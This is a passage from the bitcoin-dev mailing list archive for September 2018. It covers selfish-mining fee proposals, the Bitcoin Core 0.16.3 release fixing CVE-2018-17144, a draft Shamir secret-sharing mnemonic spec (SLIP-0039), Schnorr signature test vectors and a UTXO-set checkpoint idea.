An alternative is to increase difficulty with this or a similar
function instead of reward. From a miner's perspective, there is not a
difference (they are only interested in the (price+fees)/difficulty
ratio. This would have the same problems.

The problem has been solved to the best of our ability by the Nakamoto
consensus. The math is straightforward, so you can't get around it's
failings unless it's a profound solution or we shift trust to some
place else. Currently we have to choose and trust a small group of
coins (or 1) to be the best choice(s), and to trust that the reward
plus fees we pay for mining (compared to coin value) is enough to
prevent a 51% attack.

> Say p is the peak hashrate for 365 periods (1 year)
> consisting of 144 blocks, h is the hashrate of the last 144 block (1
> day) period, and r is the base subsidy (12.5 BTC currently). You can
> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> peak you get the full reward. Otherwise you get less, down to a min of

From onelineproof at gmail.com  Mon Sep 17 13:18:53 2018
From: onelineproof at gmail.com (Andrew)
Date: Mon, 17 Sep 2018 13:18:53 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <B1863BA1-59D4-40FD-8D6E-8991BC25BFC8@voskuil.org>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
	<PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<B1863BA1-59D4-40FD-8D6E-8991BC25BFC8@voskuil.org>
Message-ID: <CAL8tG=mXXtT-W5zW6H25jNY_H8cr+2JK66ocpjptw+T3W+VwYQ@mail.gmail.com>

> I see what you say, however, since the proposal as I have read it says "And this will keep happening as long as hashrate keeps rising," - what actually happens in the case hashrate stagnates or falls?

In general, a target hashrate can be set by users (can be less or more
than the peak hashrate). As long as hashrate is rising and still
didn't reach the target, miners will incrementally get the reserve
fees. Once the "contract" times out, the remaining part can be used as
fees by the users who created the reserve fee "contract". So if
hashrate remains the same or falls, then users get the reserve fees
back.

I agree that we can't stop people from being greedy. If they are not
Bitcoin mining, they will try to put their energy to earn in some
other way...The hashrate is related the demand for Bitcoin (price) and
the amount of fees/subsidies the miners will get paid. For every level
of mining rewards (based on demand) there exists a limit on the
hashrate. Once hashrate gets large enough, no new miners (additional
hashrate) will want to join since their share of the hashrate is too
small to make a profit.

Also with merge mining and proof of space we can be quite efficient in
the future. But of course I sympathize with the "don't be greedy"
philosophy, and it can be good to educate people to use less resources
than they need, just I think it's a bit outside of the scope of what
the Bitcoin software protocol does.

From laanwj at gmail.com  Tue Sep 18 21:07:35 2018
From: laanwj at gmail.com (Wladimir J. van der Laan)
Date: Tue, 18 Sep 2018 23:07:35 +0200
Subject: [bitcoin-dev] Bitcoin Core 0.16.3 released
Message-ID: <20180918210735.mzuydlanx5biajy3@aurora.visucore.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Bitcoin Core version 0.16.3 is now available from:

  <https://bitcoincore.org/bin/bitcoin-core-0.16.3/>

or through bittorrent

    magnet:?xt=urn:btih:a6015029671a445a7a07026b3e4a0fe54c2b2df3&dn=bitcoin-core-0.16.3&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fexplodie.org%3A6969

This is a new minor version release, with various bugfixes.

Please report bugs using the issue tracker at GitHub:

  <https://github.com/bitcoin/bitcoin/issues>

To receive security and update notifications, please subscribe to:

  <https://bitcoincore.org/en/list/announcements/join/>

How to Upgrade
==============

If you are running an older version, shut it down. Wait until it has completely
shut down (which might take a few minutes for older versions), then run the
installer (on Windows) or just copy over `/Applications/Bitcoin-Qt` (on Mac)
or `bitcoind`/`bitcoin-qt` (on Linux).

The first time you run version 0.15.0 or newer, your chainstate database will be converted to a
new format, which will take anywhere from a few minutes to half an hour,
depending on the speed of your machine.

Note that the block database format also changed in version 0.8.0 and there is no
automatic upgrade code from before version 0.8 to version 0.15.0 or higher. Upgrading
directly from 0.7.x and earlier without re-downloading the blockchain is not supported.
However, as usual, old wallet versions are still supported.

Downgrading warning
- -------------------

Wallets created in 0.16 and later are not compatible with versions prior to 0.16
and will not work if you try to use newly created wallets in older versions. Existing
wallets that were created with older versions are not affected by this.

Compatibility
==============

Bitcoin Core is extensively tested on multiple operating systems using
the Linux kernel, macOS 10.8+, and Windows Vista and later. Windows XP is not supported.

Bitcoin Core should also work on most other Unix-like systems but is not
frequently tested on them.

Notable changes
===============

Denial-of-Service vulnerability
- -------------------------------

A denial-of-service vulnerability (CVE-2018-17144) exploitable by miners has
been discovered in Bitcoin Core versions 0.14.0 up to 0.16.2. It is recommended
to upgrade any of the vulnerable versions to 0.16.3 as soon as possible.

0.16.3 change log
- ------------------

### Consensus
- - #14249 `696b936` Fix crash bug with duplicate inputs within a transaction (TheBlueMatt, sdaftuar)

### RPC and other APIs
- - #13547 `212ef1f` Make `signrawtransaction*` give an error when amount is needed but missing (ajtowns)

### Miscellaneous
- - #13655 `1cdbea7` bitcoinconsensus: invalid flags error should be set to `bitcoinconsensus_err` (afk11)

### Documentation
- - #13844 `11b9dbb` correct the help output for -prune (hebasto)

Credits
=======

Thanks to everyone who directly contributed to this release:

- - Anthony Towns
- - Hennadii Stepanov
- - Matt Corallo
- - Suhas Daftuar
- - Thomas Kerin
- - Wladimir J. van der Laan

And to those that reported security issues:

- - (anonymous reporter)

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEnerg3HBjJJ+wVHRoHkrtYphs0l0FAluhaKgACgkQHkrtYphs
0l1r5gf+IVeOOWeZd61ARt+0pfy2KnDRgKh7x0RJ7AFl6mWyply21zUQQx+Q6leB
P0IkzH31ssA9oKMUW6J0s8VavQ22OqHwbqrPRDXazf7auJ81jeR6Tmfkev4xg5fC
jyRQH4klctT0jDT1P+vtMejP50iqRxDC3TP9X9sXKZupGyHQuhu8XoXGZ1JF+PEX
Ba/sLiz3+d/0n6KiplI4ycnEZC5Q2hRw4O4c/2wjIdqd5hEhSH2ylmztYs2TM388
NoaPEIL9niIjwAUI4bBYNebwyRStcqoK4JEdZhvM1aXd39eymPsYUTtUcr5HL9n6
zFo8I0CXoVWT0bOGsubmo58/o2xcSg==
=9rAz
-----END PGP SIGNATURE-----


From pieter.wuille at gmail.com  Wed Sep 19 00:06:17 2018
From: pieter.wuille at gmail.com (Pieter Wuille)
Date: Tue, 18 Sep 2018 17:06:17 -0700
Subject: [bitcoin-dev] Bitcoin Core update notice
Message-ID: <CAPg+sBhdO_7m46UphVay3vJUM+Va9=3Kq5aa4VQN4cobY-krmw@mail.gmail.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Hello all,

Bitcoin Core 0.16.3 was just released with a fix for
CVE-2018-17144:
https://bitcoincore.org/en/2018/09/18/release-0.16.3/

We urge all network participants to upgrade to 0.16.3[*] as soon
as possible.

[*] For those who build from source, the 0.14, 0.15, 0.16, 0.17,
and master branches on GitHub (https://github.com/bitcoin/bitcoin)
are fixed as well.

- --
Pieter
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEErGYmFy4AqCz/rolypjbpdjH3Z+AFAluhkogACgkQpjbpdjH3
Z+AZFg//a1UzupFYJPwM8iFWycIk3iU6VijgvuoeWv4Bq+BHxw/UtVsyI5XA4X/M
27wm7RtHQvgP/5BcWOTyXtX3WorKAVs3y6Ha3Ib67DEWUQ7HmWex1H5iSShO3PS0
lle1mwfqRY0/vC/zjIqqXiGrTstvy7Et6evTqc2zrsJrsc5pxyKxehYb0dtaR+9e
CzoioYhUWcYxy0LCtMztVBUlts8OfMK1xhpCDCk/XIVoJEqJuW5/wmux9tR0sxoJ
elEVdRGPrNfQ4lPQXDin8oUuRQ/bdfjncOu+CEWS6LgIIUXdWbzehxLpG80jCvzM
Id7ALPsTgazfj0y8EUyBlkrwlgHHIxGpHfxUJyybWMvJmjbRCQpIMKSTNsuY4DxD
mi8p2ZTfM03k7nLZbiZZdI3sGw6eACrTIx38tS+MiC8Hr69lHClTww8Q4qsMqHHd
X/eOQXLTtPzLeN9m5SmoFGFlHyHFMs+hMrhzIpig9n+sZbrYvDBOJlw28t3tYGKR
Z/WfpIUot6HdWJjsNkf3BLZF12BB/iwe2AplYYqUE8N8b6mJvbA2PkcXNbgAGexR
ySGl/CTMrpDKE5/m7cjP3h/5CSQ5M4YBPI3HijCWJQ/fSoAq9VTz0x+9V3pJyiDf
fSSdJa7QhS3flBcQ3HlrXaLBaosHoT3PHf4d16iyR6fvcn4s4HQ=
=nubz
-----END PGP SIGNATURE-----

From onelineproof at gmail.com  Tue Sep 18 20:26:16 2018
From: onelineproof at gmail.com (Andrew)
Date: Tue, 18 Sep 2018 20:26:16 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CADtTMvmG8af1+iav6A7y14EPtSgatoGwY5Rpxunm_qLuWMasgw@mail.gmail.com>
References: <CADtTMvmG8af1+iav6A7y14EPtSgatoGwY5Rpxunm_qLuWMasgw@mail.gmail.com>
Message-ID: <CAL8tG=mKsyN25RPVosGGp4ur_y2QiGwj+puzib2xPdPet8eOPw@mail.gmail.com>

@ Eric: Yes I forgot to mention that cost (in addition to price) also
determines the profitability of mining and thus the total hashpower. I
disagree with your assessment of merge mining as really what matters
is opportunity cost of honestly mining vs attacking, and one reason we
are currently safe from other networks attacking is that SHA256 is
ASIC friendly and currently the main network utilising this (the
ASICs) is Bitcoin mining. It would be hard for people computing prime
numbers to quickly switch to Bitcoin mining, since they would need the
ASICs. But if you really want to discuss this then I suggest opening a
new thread here or bitcointalk since this is off-topic from my thread.
Also there is a discussion about merge mining here:
https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2014-January/003981.html

On Mon, Sep 17, 2018 at 2:09 PM, Zawy via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
> The 51% problem is deep. Any discussion of a solution to it should
> begin with a link to an article that shows a profound discovery has
> been made. Selfish mining prevention and pollution should be on
> bitcoin-discussion, but it appears that list is not active.
>
> The problem with Andrew's idea below is that it is a positive feedback
> loop that amplifies oscillations. If h goes up or down due to price
> changes or random solvetime variation, then the net reward goes in the
> same direction, which motivates miners to cause h to go even further
> in the same direction, which is a positive feedback loop until some
> limit is reached. To make matters worse, miner profit motivation in
> choosing which coin to mine is a non-linear function: a 30% drop in
> difficulty (or 30% increase in this reward function) in an alt coin
> can cause a 300% increase in hashrate.
>
> Average of 144 past blocks to determine h are needed so that it does
> not vary too much.  A selfish mine of 72 blocks would result in only a
> 12.5% loss compared to not using this pro-oscillation function. I've
> tried similar reward functions in trying to reduce on-off mining.
>
> There may also be a problem of issuing too many or too few coins,
> depending on how fast h rises in the long term.
>
> An alternative is to increase difficulty with this or a similar
> function instead of reward. From a miner's perspective, there is not a
> difference (they are only interested in the (price+fees)/difficulty
> ratio. This would have the same problems.

@Zawy: Are you talking about my proposal to modulate the subsidies?
Because if you read my second post you see that I scrapped that part
as it can be disruptive, and I am only proposing to let users have
more control over how their fees are spent. A certain portion of fees
is put in reserve and gets allocated to miners based on hashrate
conditions, and once the "contract" expires, the remaining part goes
back to the user for future fee payments. I understand it is unclear
whether this will cause a significant benefit (I can work on
simulations if I have time), but what could possibly go wrong with
giving users more choice over how their fees are spent?

Also if you see my post, I am not just trying to prevent Selfish
Mining (33%) or 51% attacks, but in general any types of attacks that
try to drive away mining competition (like block withholding attacks,
networking attacks, etc).

Someone on bitcointalk was also worried about a positive feedback
loop, and I think my answer remains valid:
"First, I think a price drop will be slightly offset by the lower rate
of coins being mined. Also, confirmation times will get longer: Both
the time to get a block will increase and the number of confirmations
needed to have enough work done on the chain so that your transaction
is considered safe. The fees would likely rise and this would increase
rewards to miners, especially in a fee-market dominated future." Merge
mining can also help to smooth hashrate so it doesn't depend so much
on price, but even without merge mining it is not so clear that a
there would be a destructive feedback loop and that's where
simulations / math equations would help.

Your idea of increasing difficulty, I haven't thought about much, but
I don't think it's the same effect. When you increase the difficulty,
the reward per block remains the same, only reward per real time
falls, but it could also have the negative effect of incentivizing
selfish mining or timestamp attacks to reverse the increased
difficulty. Though actually timestamp attacks would sort of be
dis-incentivized if underestimates of hashrate led to lower rewards.

Obviously I will not work on a pull request if there is no strong
interest for this. I think it is a harmless addition, so if I have
time I can work on simulations to try to prove that there is a
significant benefit with doing this.


-- 
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647

From andrew.kozlik at satoshilabs.com  Thu Sep 20 16:19:56 2018
From: andrew.kozlik at satoshilabs.com (Andrew Kozlik)
Date: Thu, 20 Sep 2018 18:19:56 +0200
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic Codes
Message-ID: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>

Hello everyone,

We are currently writing a new specification for splitting BIP-32 master
seeds into multiple mnemonics using Shamir's secret sharing scheme. We
would be interested in getting your feedback with regard to the
high-level design of the new spec:
https://github.com/satoshilabs/slips/blob/master/slip-0039.md
Please focus your attention on the section entitled "Master secret
derivation functions", which proposes several different solutions. Note
that there is a Design Rationale section at the very end of the
document, which should answer some of the questions you may have. The
document is a work in progress and we are aware that some technical
details have not been fully specified. These will be completed once the
high level design has been settled.

Thanks,

Andrew Kozlik
TREZOR Team



From roconnor at blockstream.io  Thu Sep 20 21:12:42 2018
From: roconnor at blockstream.io (Russell O'Connor)
Date: Thu, 20 Sep 2018 17:12:42 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
References: <CAPg+sBj7f+=OYXuOMdNeJk3NBG67FSQSF8Xv3seFCvwxCWq69A@mail.gmail.com>
Message-ID: <CAMZUoKmeW+q0+84vHjD0L_Jzn4j3E6JXV0O8efYayfWf-91HKQ@mail.gmail.com>

It would be helpful to add the intermediate 'e' values computed to the
first four test vectors.

On Fri, Jul 6, 2018 at 2:08 PM, Pieter Wuille via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> Hello everyone,
>
> Here is a proposed BIP for 64-byte elliptic curve Schnorr signatures,
> over the same curve as is currently used in ECDSA:
> https://github.com/sipa/bips/blob/bip-schnorr/bip-schnorr.mediawiki
>
> It is simply a draft specification of the signature scheme itself. It
> does not concern consensus rules, aggregation, or any other
> integration into Bitcoin - those things are left for other proposals,
> which can refer to this scheme if desirable. Standardizing the
> signature scheme is a first step towards that, and as it may be useful
> in other contexts to have a common Schnorr scheme available, it is its
> own informational BIP.
>
> If accepted, we'll work on more production-ready reference
> implementations and tests.
>
> This is joint work with several people listed in the document.
>
> Cheers,
>
> --
> Pieter
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180920/b4f3bef3/attachment.html>

From ChristopherA at lifewithalacrity.com  Fri Sep 21 19:29:33 2018
From: ChristopherA at lifewithalacrity.com (Christopher Allen)
Date: Fri, 21 Sep 2018 12:29:33 -0700
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic
	Codes
In-Reply-To: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
References: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
Message-ID: <CACrqygCoqFMFLTpn5PSMR2_wSHnWsXSyZZ_jhk-FbvZHwwz4nA@mail.gmail.com>

On Fri, Sep 21, 2018 at 11:18 AM Andrew Kozlik via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> We are currently writing a new specification for splitting BIP-32 master
> seeds into multiple mnemonics using Shamir's secret sharing scheme. We
> would be interested in getting your feedback with regard to the
> high-level design of the new spec:
> https://github.com/satoshilabs/slips/blob/master/slip-0039.md
> Please focus your attention on the section entitled "Master secret
> derivation functions", which proposes several different solutions. Note
> that there is a Design Rationale section at the very end of the
> document, which should answer some of the questions you may have. The
> document is a work in progress and we are aware that some technical
> details have not been fully specified. These will be completed once the
> high level design has been settled.
>

I and a number of companies & communities I am involved with are very
interested in this.

A challenge is that Shamir Secret Sharing has subtleties. To quote Greg
Maxwell:

> I think Shamir Secret Sharing (and a number of other things, RNGs for
example), suffer from a property where they are just complex enough that
people are excited to implement them often for little good reason, and then
they are complex enough (or have few enough reasons to invest significant
time) they implement them poorly?.

Some questions for you:

* What other teams or communities besides Trezor are committed to
standardizing a Shamir Secret Sharing Scheme? I can say that the
#RebootingWebOfTrust community (meeting again for the 7th time next week in
Toronto https://rwot7.eventbrite.com) are very interested.

* Where do you want to hold discussions on this? Do people object to having
this discussion on this mailing list? Or should it be issues in SLIPS repo
or on some other mailing list?

* Presuming a successful split of secrets, I don?t know all the adversarial
problems that are associated with recovery of a SSS. As this would be an
interactive event, I presume an attacker can DOS a request to reassemble
keys (so maybe some the of integrity of each share vs all is required). And
of course there are the biggest problems:  impersonation of a reassembly
request and a MitM of a reassembly request. Are there other attacks? Are
you trying to mitigate any of these?

Two comments:

* The Lightning Network community has added to their BIP32 mnemonics the
ability to have a birthday in the seed, to make it easier  to scan the
blockchain for keys, as well as a byte with some way to know how to derive
keys paths for it. I don?t seee a BOLT for this (it was mentioned in
https://bitcoin.stackexchange.com/questions/74805/what-is-birthday-in-the-context-of-bip39-lightning-seed-generation)
 I would suggest that you also get some of their latest thoughts and
incorporate them.

* I worked with Chris Vickery while at Blockstrham on various possible ways
to improve mnemonic word lists. I?m not suggesting that you necessarily go
as far as we did to try to create a mnemonic that is iambic pentameter
poetry (inspired by
https://www.isi.edu/natural-language/mt/memorize-random-60.pdf), however,
we did find sources for words that are concrete (for example table is more
concrete than truth
http://crr.ugent.be/papers/Brysbaert_Warriner_Kuperman_BRM_Concreteness_ratings.pdf
) or have strong emotional valence attachment (truth is more emotional than
table), both of which make can words more memorable. I also found lists of
words that are hard to pronounce unless you are English native, and
eliminated them from my own list.

Among the results of this was a new BIP-39 2048 word compatible word list
filtered for memorability (concreteness & emotional valence) and
suitability for iambic pentameter, which is located:


https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/iambic-wordlist.json


?which was created from the repo at

    https://github.com/ChristopherA/password_poem

You can a number of other word lists that I?ve collected here
https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/

If you want to replicate what we did with your own criteria, you may want
to incorporate information from the CMU dictitionary
http://www.speech.cs.cmu.edu/cgi-bin/cmudict, the top 5000 words
https://github.com/ChristopherA/password_poem/blob/master/top5000.json,
 concrete word lists
http://crr.ugent.be/papers/Concreteness_ratings_Brysbaert_et_al_BRM.txt and
emotional words  (valence) http://crr.ugent.be/archives/1003

? Christopher Allen
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180921/6018e9cd/attachment-0001.html>

From kiwigb at yahoo.com  Fri Sep 21 22:39:46 2018
From: kiwigb at yahoo.com (gb)
Date: Sat, 22 Sep 2018 10:39:46 +1200
Subject: [bitcoin-dev] [bitcoin-core-dev] Bitcoin Core update notice
In-Reply-To: <CAPg+sBhdO_7m46UphVay3vJUM+Va9=3Kq5aa4VQN4cobY-krmw@mail.gmail.com>
References: <CAPg+sBhdO_7m46UphVay3vJUM+Va9=3Kq5aa4VQN4cobY-krmw@mail.gmail.com>
Message-ID: <1537569586.4405.2.camel@yahoo.com>

If the bugfix can be backported to earlier versions why is the
hype/hysteria about "everybody" must immediately upgrade to 0.16.3
currently being spread on the forums/reddit?

https://bitcointalk.org/index.php?topic=5034070.0
https://old.reddit.com/r/Bitcoin/comments/9hp90p/1775_nodes_out_of_9616_185_are_currently_on/

I don't see any effort to correct this misinformation either.

Regards.

On Tue, 2018-09-18 at 17:06 -0700, Pieter Wuille via bitcoin-core-dev
wrote:
> Hello all,
> 
> Bitcoin Core 0.16.3 was just released with a fix for
> CVE-2018-17144:
> https://bitcoincore.org/en/2018/09/18/release-0.16.3/
> 
> We urge all network participants to upgrade to 0.16.3[*] as soon
> as possible.
> 
> [*] For those who build from source, the 0.14, 0.15, 0.16, 0.17,
> and master branches on GitHub (https://github.com/bitcoin/bitcoin)
> are fixed as well.
> 
> --
> Pieter
> _______________________________________________
> bitcoin-core-dev mailing list
> bitcoin-core-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-core-dev



From dscotese at litmocracy.com  Sat Sep 22 01:49:47 2018
From: dscotese at litmocracy.com (Dave Scotese)
Date: Fri, 21 Sep 2018 18:49:47 -0700
Subject: [bitcoin-dev] Proposal to replace full blockchain with recent
	history plus UTXO Set
Message-ID: <CAGLBAhfOdeNfsOfzY0H7wxG1jn2SE3P36aRd_VHXb5nizwA93A@mail.gmail.com>

I've been working on an idea that relieves full nodes of storing the entire
blockchain. Open source software generally relies on the fact that "enough"
people agree that it's secure. Bitcoin software works that way too. So if
you understand enough to see that a UTXO set is valid at a certain block
height, and there are enough other people who agree and that set is
recognizable by humans, then we can use that UTXO set and ditch the
blockchain that existed up to that point. It would save a lot of storage
and make it a lot easier to run a full node.

Have you reviewed the source code from which your wallets were compiled?
At some point, we all trust third parties, but generally (at least among
people who understand Bitcoin) they are large composite groups so that no
small group or individual can profit from cheating.

I look forward to answering any concerns and also to any offers of help.   I
used block 542324 of the Bitcoin blockchain to make a memorable experience
using the game of life. I wrote a script for the open-source Game-of-Life
software Golly and shared it in the paste at https://pastebin.com/k5Ssc0qk.
It produces the image at https://imgur.com/a/rwIQuVz. If someone can tell
me how to get a UTXO Set from the bitcoin client, I'll send them $50 of
bitcoin. Then I could get the SHA256 hash of that set and try to make a
recognizable checkpoint for the Bitcoin blockchain. If someone runs Golly
and shares a video of the game playing out (into the apron-shaped image),
I'll send them $50 of bitcoin too.

In a few decades when the blockchain has grown to a few terabytes and the
UTXO Set is still just a few gigabytes, I'd like to see more people start
running full nodes without the hassle of a long wait and loads of storage
space. That's what stops me from running one.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180921/90e3c480/attachment.html>

From vizeet at gmail.com  Sat Sep 22 04:54:24 2018
From: vizeet at gmail.com (vizeet srivastava)
Date: Sat, 22 Sep 2018 10:24:24 +0530
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic
	Codes
In-Reply-To: <CACrqygCoqFMFLTpn5PSMR2_wSHnWsXSyZZ_jhk-FbvZHwwz4nA@mail.gmail.com>
References: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
	<CACrqygCoqFMFLTpn5PSMR2_wSHnWsXSyZZ_jhk-FbvZHwwz4nA@mail.gmail.com>
Message-ID: <CAEmwXH=M0VsO3FeRr8PK+iuGmjTX5HYU68bVHxsV0kvdYtDGSQ@mail.gmail.com>

I see one benefit which i am looking for. I may not need to use all public
keys in p2sh script instead i can use p2pkh and retrieve funds by using
threshold number of keys..so in case i loose a public key along with
private key i still may have other public key private key pairs to
retrieve. For me it sounds interesting. I need to understand how it is
going to get implemented in more detail.

On Sat 22 Sep, 2018, 9:53 AM Christopher Allen via bitcoin-dev, <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> On Fri, Sep 21, 2018 at 11:18 AM Andrew Kozlik via bitcoin-dev <
> bitcoin-dev at lists.linuxfoundation.org> wrote:
>
>> We are currently writing a new specification for splitting BIP-32 master
>> seeds into multiple mnemonics using Shamir's secret sharing scheme. We
>> would be interested in getting your feedback with regard to the
>> high-level design of the new spec:
>> https://github.com/satoshilabs/slips/blob/master/slip-0039.md
>> Please focus your attention on the section entitled "Master secret
>> derivation functions", which proposes several different solutions. Note
>> that there is a Design Rationale section at the very end of the
>> document, which should answer some of the questions you may have. The
>> document is a work in progress and we are aware that some technical
>> details have not been fully specified. These will be completed once the
>> high level design has been settled.
>>
>
> I and a number of companies & communities I am involved with are very
> interested in this.
>
> A challenge is that Shamir Secret Sharing has subtleties. To quote Greg
> Maxwell:
>
> > I think Shamir Secret Sharing (and a number of other things, RNGs for
> example), suffer from a property where they are just complex enough that
> people are excited to implement them often for little good reason, and then
> they are complex enough (or have few enough reasons to invest significant
> time) they implement them poorly?.
>
> Some questions for you:
>
> * What other teams or communities besides Trezor are committed to
> standardizing a Shamir Secret Sharing Scheme? I can say that the
> #RebootingWebOfTrust community (meeting again for the 7th time next week in
> Toronto https://rwot7.eventbrite.com) are very interested.
>
> * Where do you want to hold discussions on this? Do people object to
> having this discussion on this mailing list? Or should it be issues in
> SLIPS repo or on some other mailing list?
>
> * Presuming a successful split of secrets, I don?t know all the
> adversarial problems that are associated with recovery of a SSS. As this
> would be an interactive event, I presume an attacker can DOS a request to
> reassemble keys (so maybe some the of integrity of each share vs all is
> required). And of course there are the biggest problems:  impersonation of
> a reassembly request and a MitM of a reassembly request. Are there other
> attacks? Are you trying to mitigate any of these?
>
> Two comments:
>
> * The Lightning Network community has added to their BIP32 mnemonics the
> ability to have a birthday in the seed, to make it easier  to scan the
> blockchain for keys, as well as a byte with some way to know how to derive
> keys paths for it. I don?t seee a BOLT for this (it was mentioned in
> https://bitcoin.stackexchange.com/questions/74805/what-is-birthday-in-the-context-of-bip39-lightning-seed-generation)
>  I would suggest that you also get some of their latest thoughts and
> incorporate them.
>
> * I worked with Chris Vickery while at Blockstrham on various possible
> ways to improve mnemonic word lists. I?m not suggesting that you
> necessarily go as far as we did to try to create a mnemonic that is iambic
> pentameter poetry (inspired by
> https://www.isi.edu/natural-language/mt/memorize-random-60.pdf), however,
> we did find sources for words that are concrete (for example table is more
> concrete than truth
> http://crr.ugent.be/papers/Brysbaert_Warriner_Kuperman_BRM_Concreteness_ratings.pdf
> ) or have strong emotional valence attachment (truth is more emotional than
> table), both of which make can words more memorable. I also found lists of
> words that are hard to pronounce unless you are English native, and
> eliminated them from my own list.
>
> Among the results of this was a new BIP-39 2048 word compatible word list
> filtered for memorability (concreteness & emotional valence) and
> suitability for iambic pentameter, which is located:
>
>
> https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/iambic-wordlist.json
>
>
> ?which was created from the repo at
>
>     https://github.com/ChristopherA/password_poem
>
> You can a number of other word lists that I?ve collected here
> https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/
>
> If you want to replicate what we did with your own criteria, you may want
> to incorporate information from the CMU dictitionary
> http://www.speech.cs.cmu.edu/cgi-bin/cmudict, the top 5000 words
> https://github.com/ChristopherA/password_poem/blob/master/top5000.json,
>  concrete word lists
> http://crr.ugent.be/papers/Concreteness_ratings_Brysbaert_et_al_BRM.txt
> and emotional words  (valence) http://crr.ugent.be/archives/1003
>
> ? Christopher Allen
>
>
>
>
>
>
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180922/daf55cc6/attachment-0001.html>

From achow101-lists at achow101.com  Sat Sep 22 04:56:13 2018
From: achow101-lists at achow101.com (Andrew Chow)
Date: Sat, 22 Sep 2018 04:56:13 +0000
Subject: [bitcoin-dev] [bitcoin-core-dev] Bitcoin Core update notice
In-Reply-To: <1537569586.4405.2.camel@yahoo.com>
References: <CAPg+sBhdO_7m46UphVay3vJUM+Va9=3Kq5aa4VQN4cobY-krmw@mail.gmail.com>
	<1537569586.4405.2.camel@yahoo.com>
Message-ID: <FbOWqeUN8UVSAnvIRst9G-AuQ2z0U9qh5OV6Y-q1vpjCBXQ95fyyAUyb3qclC3GtC8EZuEWeGdtB11D17VQK2Kx2plbwqsWpsNOq33pJefI=@achow101.com>

The backported versions have not been released yet. They are still going
through the gitian build process. 0.16.3 was the first one to be
released so that is the one that everyone is being recommended to
upgrade to. Regardless, you should upgrade to a patched version, whether
that is 0.14.3, 0.15.2, or 0.16.3. It is not misinformation that
everybody must upgrade.


On 09/21/2018 06:39 PM, gb via bitcoin-dev wrote:
> If the bugfix can be backported to earlier versions why is the
> hype/hysteria about "everybody" must immediately upgrade to 0.16.3
> currently being spread on the forums/reddit?
>
> https://bitcointalk.org/index.php?topic=5034070.0
> https://old.reddit.com/r/Bitcoin/comments/9hp90p/1775_nodes_out_of_9616_185_are_currently_on/
>
> I don't see any effort to correct this misinformation either.
>
> Regards.
>
> On Tue, 2018-09-18 at 17:06 -0700, Pieter Wuille via bitcoin-core-dev
> wrote:
>> Hello all,
>>
>> Bitcoin Core 0.16.3 was just released with a fix for
>> CVE-2018-17144:
>> https://bitcoincore.org/en/2018/09/18/release-0.16.3/
>>
>> We urge all network participants to upgrade to 0.16.3[*] as soon
>> as possible.
>>
>> [*] For those who build from source, the 0.14, 0.15, 0.16, 0.17,
>> and master branches on GitHub (https://github.com/bitcoin/bitcoin)
>> are fixed as well.
>>
>> --
>> Pieter
>> _______________________________________________
>> bitcoin-core-dev mailing list
>> bitcoin-core-dev at lists.linuxfoundation.org
>> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-core-dev
>
> _______________________________________________
> bitcoin-dev mailing list
